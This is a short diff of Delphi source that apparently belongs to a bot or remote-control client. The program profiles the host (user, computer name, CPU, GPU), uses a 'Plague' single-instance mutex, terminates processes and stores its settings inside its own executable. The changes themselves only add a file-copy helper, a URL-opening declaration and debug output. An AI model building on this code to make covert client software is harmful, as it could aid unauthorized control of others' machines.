@@ -30,6 +30,8 @@ function TerminateProcessByID(ProcessID: Cardinal): Boolean;
 procedure CheckProxy;
 procedure AddProcessToList(PID: Cardinal);
 procedure RemoveProcessFromList(PID: Cardinal);
+procedure OpenURL(URL: String);
+function ChCopy(Source, Dest: String): Boolean;
 
 var
   Nick, OS, ComputerName, UserName, CPU, GPU: String;
@@ -85,6 +87,12 @@ procedure MutexMagic;
 Begin
   Mutex:=CreateMutex(Nil, True, PChar(Settings.ReadString('General', 'Mutex', 'Plague')));
   if GetLastError=ERROR_ALREADY_EXIST then Halt(0);
+end;
+
+function ChCopy(Source, Dest: String): Boolean;
+Begin
+  CopyFile(PChar(Source), PChar(Dest), False);
+  Result:=FileExists(Dest);
 end;
 
 procedure AddProcessToList(PID: Cardinal);
@@ -455,9 +463,11 @@ Begin
   Str:=TStringList.Create;
   Settings.GetStrings(Str);
   Res:=BeginUpdateResource(PChar(ExeName), False);
-  UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, @Str.Text[1], Length(Str.Text));
-  Str.Free;
+  Writeln('Res = ',Res); Sleep(5000);
+  if UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, @Str.Text[1], Length(Str.Text))
+  then Writeln('Yes') else Writeln('No');
   EndUpdateResource(Res, False);
+  Str.Free;
 end;
 
 function Adler32(Str: String): LongWord;
